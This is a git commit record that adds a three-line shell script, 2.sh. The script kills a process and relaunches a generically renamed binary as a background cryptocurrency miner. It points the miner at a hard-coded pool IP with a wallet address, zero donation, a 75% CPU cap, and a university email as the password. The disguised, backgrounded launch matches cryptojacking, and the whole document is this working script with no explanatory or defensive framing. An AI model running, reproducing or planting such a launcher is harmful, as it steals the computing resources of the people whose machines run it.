62210925a7e9d5eb160f8ae88a34561b668f571a
sawyeregumbrell <59648686+sawyeregumbrell@users.noreply.github.com>
2020-01-08 19:53:45 +0800

    Add files via upload

---
+++ 2.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 188.165.224.211:49227 -u 44faAcPFKCXXpLU1MEYAv5P5i1aHbyG55TdEdTurv4CWQGqfTNopRYHhumRGXbRSJQBuW4aN9U453JVB4X3iKoCi4gvaxvE --pass=x:sawyere.gumbrell@my.gavilan.edu --rig-id=21 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=75 --av=1
